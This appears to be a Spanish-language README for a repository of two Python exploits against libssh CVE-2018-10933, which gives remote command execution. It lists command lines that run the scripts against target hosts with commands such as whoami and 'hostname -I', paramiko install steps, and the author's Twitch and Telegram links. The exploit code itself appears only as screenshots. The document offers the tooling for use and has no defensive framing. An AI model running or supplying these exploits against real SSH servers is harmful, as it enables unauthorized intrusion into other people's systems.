# libssh

Ataque: RCE Ejecucion de comandos remoto

Servicio: libssh 

CVE: CVE-2018-10933 

(Ambos exploits cumplen la misma funcion - ya va en gusto usar el que desee)

# Redes

Twitch: https://www.twitch.tv/4nonimo501

Telegram: https://t.me/Pen7esting

https://t.me/Owasp_Top_10

https://t.me/Active_Directory

https://t.me/ultimostiemp0s

https://t.me/r4ndonn

# Exploit 1

![exploit-libssh](https://user-images.githubusercontent.com/67207446/235363870-a5953fcf-072e-4c78-92fe-734cd9442c96.png)

python3 script_name.py 192.168.1.10 22 ls

python3 script_name.py 192.168.1.10 22 "hostname -I"

# Exploit 2

![image](https://user-images.githubusercontent.com/67207446/235362690-e590b25f-2a75-48f8-afa9-caf0bf4818d3.png)

## Ejecucion

python3 exploit.py --host 172.16.20.x -p 22 "whoami"

## Instalacion y actualizacion de paramiko

Instalacion:

sudo apt-get update
sudo apt-get install python-paramiko

Actualizacion:

pip install --upgrade paramiko
